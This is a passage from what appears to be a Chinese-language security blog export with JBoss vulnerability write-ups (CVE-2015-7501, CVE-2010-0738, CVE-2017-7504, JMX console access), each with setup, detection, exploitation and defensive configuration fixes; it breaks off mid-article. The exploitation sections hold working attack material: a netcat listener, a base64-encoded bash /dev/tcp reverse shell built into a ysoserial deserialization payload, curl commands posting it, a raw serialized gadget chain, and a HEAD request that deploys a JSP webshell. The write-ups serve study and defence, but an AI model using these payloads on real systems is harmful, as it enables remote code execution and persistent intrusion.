<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>

<p>如果可以成功访问，证明存在此漏洞</p>
<p>该页面为JBoss控制台，暴漏在公网存在多处漏洞</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMXInvokerServlet 反序列化漏洞 - CVE-2015-7501</title>
    <url>//7ce29cf4d767.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss在 <code>/invoker/JMXInvokerServlet</code> 请求中读取了用户传入的对象，然后我们可以利用 <code>Apache Commons Collections</code> 中的 <code>Gadget</code> 执行任意代码。</p>
<p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：3.2.4~4.0.5</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>

<p>如果提示下载信息，则说明存在此漏洞</p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/JMXInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss JMX控制台安全验证绕过漏洞 - CVE-2010-0738</title>
    <url>//3a334b8ad7cb.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        JXM控制台配置仅指定了对于<code>GET</code>和<code>POST</code>请求的限制，入侵者可以通过<code>HEAD</code>等方式提交特制的HTTP请求以绕过身份验证并访问受限信息</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>JBoss 4.2.x</li>
<li>JBoss 4.3.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<p>当设置了登录验证，以下地址限制<code>GET</code>和<code>POST</code>方式访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p>这里我们通过其他的HTTP方法使用<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法</p>
<p>通过抓包将<code>POST</code>方法改成<code>HEAD</code>，并将传参移动到URL处</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HEAD /jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=0&amp;arg0=shell2.war&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3C%25eval%20request%28%22admin%22%29%25%3E&amp;arg4=True HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>以上代码的URL处不要轻易修改，比如空格，回车，会导致格式错误</p>
<p><code>arg3</code>的内容为<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code>通过<code>Escape</code>加密之后得到的值</p>
<p>直接传参会导致报错，上传失败</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在上述代码中禁止所有方法访问，而不是仅为<code>GET</code>和<code>POST</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>升级JBoss版本</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss MQ JMS 反序列化漏洞 - CVE-2017-7504</title>
    <url>//0d8902f8e415.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>JBoss AS 4.x</code> 及之前版本中， <code>JbossMQ</code> 实现过程的 <code>JMS over HTTP Invocation Layer</code> 的 <code>HTTPServerILServlet.java</code> ⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>&lt;= JBoss AS 4.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure>

<p>如果返回<code>This is the JBossMQ HTTP-IL</code>，则存在此漏洞</p>
<p>监听端口</p>
